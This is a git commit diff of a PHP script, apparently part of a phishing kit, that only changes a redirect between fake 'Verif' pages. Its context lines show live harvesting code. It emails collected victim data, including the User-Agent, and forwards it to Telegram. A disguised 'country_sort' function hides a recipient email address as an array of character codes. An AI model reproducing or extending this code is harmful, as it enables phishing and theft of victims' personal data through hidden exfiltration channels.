d4979d32b8e60837de8634abfc0786cd2ee6b046
X-botf <168183930+X-botf@users.noreply.github.com>
2025-06-16 18:25:16 -0400

    Update famoz2.php

--- api/famoz2.php
+++ api/famoz2.php
@@ -17,7 +17,7 @@ $message .= "User-Agent: ".$browser."\n";
 $headers = "From: Prohqcker";
 @mail($send,$subject,$message,$headers);
 send_telegram_msg($message);
-header("location:Verif2.php");
+header("location:Verif3.php");
 function country_sort(){
   $sorter = "";
   $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
